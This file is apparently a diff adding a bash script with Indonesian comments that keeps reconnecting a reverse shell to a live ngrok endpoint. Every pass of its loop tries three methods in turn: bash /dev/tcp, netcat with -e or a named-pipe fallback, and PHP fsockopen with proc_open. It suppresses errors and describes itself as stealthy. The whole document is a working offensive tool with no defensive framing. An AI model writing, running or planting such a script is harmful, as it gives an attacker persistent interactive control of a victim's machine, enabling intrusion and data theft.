@@ -1,0 +1,50 @@
+#!/bin/bash
+# ============================================================
+# Reverse Shell Auto-Reconnect (Bash, Netcat, PHP)
+# Target: 0.tcp.ap.ngrok.io:10712
+# ============================================================
+
+RHOST="0.tcp.ap.ngrok.io"
+RPORT="10712"
+SLEEP=5                     # jeda reconnect (detik)
+
+while true; do
+    echo "[*] Mencoba koneksi ke ${RHOST}:${RPORT} ..."
+
+    # --------------------------------------------------------
+    # Metode 1: Bash built-in /dev/tcp (sangat stealth)
+    # --------------------------------------------------------
+    (bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1) 2>/dev/null
+
+    # --------------------------------------------------------
+    # Metode 2: Netcat (nc) dengan fallback FIFO
+    # --------------------------------------------------------
+    if command -v nc >/dev/null 2>&1; then
+        # Coba opsi -e (jika nc mendukung)
+        nc -e /bin/bash ${RHOST} ${RPORT} 2>/dev/null
+
+        # Jika -e tidak tersedia, gunakan named pipe
+        if [ $? -ne 0 ]; then
+            rm -f /tmp/f 2>/dev/null
+            mkfifo /tmp/f 2>/dev/null
+            (cat /tmp/f | /bin/bash -i 2>&1 | nc ${RHOST} ${RPORT} > /tmp/f) 2>/dev/null
+            rm -f /tmp/f
+        fi
+    fi
+
+    # --------------------------------------------------------
+    # Metode 3: PHP 8.3.x (menggunakan proc_open untuk shell interaktif)
+    # --------------------------------------------------------
+    if command -v php >/dev/null 2>&1; then
+        php -r '
+            $sock = @fsockopen("'"${RHOST}"'", '"${RPORT}"'");
+            if ($sock) {
+                $descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
+                proc_open("/bin/bash -i", $descriptorspec, $pipes);
+            }
+        ' 2>/dev/null
+    fi
+
+    echo "[!] Koneksi terputus. Menghubungkan ulang dalam ${SLEEP} detik..."
+    sleep ${SLEEP}
+done
